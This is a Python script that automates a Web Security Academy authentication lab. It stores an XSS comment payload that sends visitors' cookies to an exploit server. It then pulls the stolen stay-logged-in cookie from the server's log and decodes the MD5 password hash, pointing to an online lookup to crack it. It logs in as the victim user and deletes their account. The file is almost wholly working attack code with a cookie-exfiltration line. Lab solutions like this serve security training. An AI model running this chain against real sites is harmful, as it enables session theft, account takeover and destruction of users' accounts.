#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
import base64
import re
from bs4 import BeautifulSoup
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Authentication Web Security Academy

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net"
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
s = requests.Session()

def get_session(url):
    r = requests.get(url, verify=False)
    sess_line = str(r.cookies)
    spl_sess1 = sess_line.split("session=", 1)[1]
    global sess
    sess = spl_sess1.split(" ", 1)[0]
    return sess

def exp_hostname(url):
    r = requests.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    for a in soup.find_all('a', href=True):
        if ('exploit' in a['href']):
            global hostname
            hostname = a['href']
            return hostname

def xss_login(s, url, sess, hostname):
    comm_path = '/post/comment'
    command = "<script>document.location='" + hostname + "/'+document.cookie</script>"
    data = {
        "postId": 1,
        "comment": command,
        "name": "test",
        "email": "test@test.com",
        "website": "https://test.com"
    }
    headers = {
        "Cookie": "session=" + sess
    }
    s.post(url + comm_path, verify=False, data=data, headers=headers)
    data1 ={
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\n Content-Type: application/javascript; charset=utf-8",
        "responseBody": "test",
        "formAction": "ACCESS_LOG"
    }
    headers1 = {
        "Origin": hostname,
        "Referer": hostname
    }
    s.post(hostname, verify=False, data=data1, headers=headers1)
    acc_log = hostname + '/log'
    r = s.get(acc_log, verify=False)
    for line in r.content.splitlines():
        if (b'stay-logged-in' in line):
            sl = line.decode("utf-8")
            res = re.search(r'\b[0-9a-zA-Z]{52}\b', sl)
            str_res = str(res.group())
            break
        else:
            pass
    b64 = str(base64.b64decode(str_res))
    spl1 = b64.split(":", 1)[1]
    global spl2
    spl2 = spl1.split("'", 1)[0]
    md5_url = "https://md5hashing.net/hash/md5/" + spl2
    print("The cracked md5 password (onceuponatime) can be found at: " + md5_url)
    data2 = {
        "username": "carlos",
        "password": "onceuponatime"
    }
    login_path = '/login'
    r1 = s.post(url + login_path, verify=False, data=data2, headers=headers, allow_redirects=False)
    cookie_dict = r1.cookies.get_dict()
    sess1 = cookie_dict['session']
    my_account = '/my-account/delete'
    data3 = {
        "password": "onceuponatime"
    }
    headers2 = {
        "Cookie": "session=" + sess1,
        "Origin": url,
        "Referer": url + '/my-account'
    }
    s.post(url + my_account, data=data3, headers=headers2, verify=False)
    r2 = s.get(url, verify=False)
    if (b'Congratulations' in r2.content):
        print("(+) Authentication Successful!")
        subprocess.call(["firefox", url])
    else:
        print("(-) Authentication Failed")

def main():
    
    print("(+) Exploiting Authentication")

    get_session(url)

    exp_hostname(url)
    
    xss_login(s, url, sess, hostname)

if __name__ == "__main__":
    main()
